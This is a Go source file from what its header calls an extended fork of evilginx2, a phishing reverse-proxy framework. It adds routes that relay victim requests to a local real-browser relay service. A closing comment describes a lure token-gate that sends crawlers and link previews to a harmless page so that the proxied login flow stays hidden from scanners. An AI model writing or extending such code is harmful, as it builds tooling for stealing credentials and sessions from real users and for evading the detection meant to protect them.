// evilginx2-extended (fork): /__relay/* reverse-proxy routes to the bgrelay sidecar.
package core

import (
	"bytes"
	"context"
	"io/ioutil"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"

	"github.com/elazarl/goproxy"
)

func (p *HttpProxy) relayPage(req *http.Request) (*http.Request, *http.Response) {
	backend := os.Getenv("EG_RELAY_BACKEND")
	if backend == "" {
		backend = "http://127.0.0.1:9445"
	}
	u, err := url.Parse(backend)
	if err != nil {
		return p.blockRequest(req)
	}
	rp := httputil.NewSingleHostReverseProxy(u)
	rr := httptest.NewRecorder()
	r2 := req.Clone(context.Background())
	r2.URL.Path = "/"
	r2.URL.RawPath = ""
	r2.RequestURI = ""
	rp.ServeHTTP(rr, r2)
	resp := goproxy.NewResponse(req, "text/html", rr.Code, "")
	if resp != nil {
		resp.Body = ioutil.NopCloser(bytes.NewReader(rr.Body.Bytes()))
		resp.ContentLength = int64(rr.Body.Len())
		if ct := rr.Header().Get("Content-Type"); ct != "" {
			resp.Header.Set("Content-Type", ct)
		}
		return req, resp
	}
	return p.blockRequest(req)
}

// relayRequest reverse-proxies /__relay/* to the local real-browser relay
// service (EG_RELAY_BACKEND, default http://127.0.0.1:9445). Buffered via a
// recorder — relay payloads are small JSON/HTML, no streaming needed.

func (p *HttpProxy) relayRequest(req *http.Request) (*http.Request, *http.Response) {
	backend := os.Getenv("EG_RELAY_BACKEND")
	if backend == "" {
		backend = "http://127.0.0.1:9445"
	}
	u, err := url.Parse(backend)
	if err != nil {
		return p.blockRequest(req)
	}
	rp := httputil.NewSingleHostReverseProxy(u)
	rr := httptest.NewRecorder()
	r2 := req.Clone(context.Background())
	r2.URL.Path = strings.TrimPrefix(req.URL.Path, "/__relay")
	if r2.URL.Path == "" {
		r2.URL.Path = "/"
	}
	r2.URL.RawPath = ""
	r2.RequestURI = ""
	rp.ServeHTTP(rr, r2)
	resp := goproxy.NewResponse(req, "text/html", rr.Code, "")
	if resp != nil {
		resp.Body = ioutil.NopCloser(bytes.NewReader(rr.Body.Bytes()))
		resp.ContentLength = int64(rr.Body.Len())
		ct := rr.Header().Get("Content-Type")
		if ct != "" {
			resp.Header.Set("Content-Type", ct)
		}
		return req, resp
	}
	return p.blockRequest(req)
}

// blockRedirect sends the requestor to a benign URL — used by the lure
// token-gate so crawlers and link previews land on a harmless page instead
// of the proxied login flow.
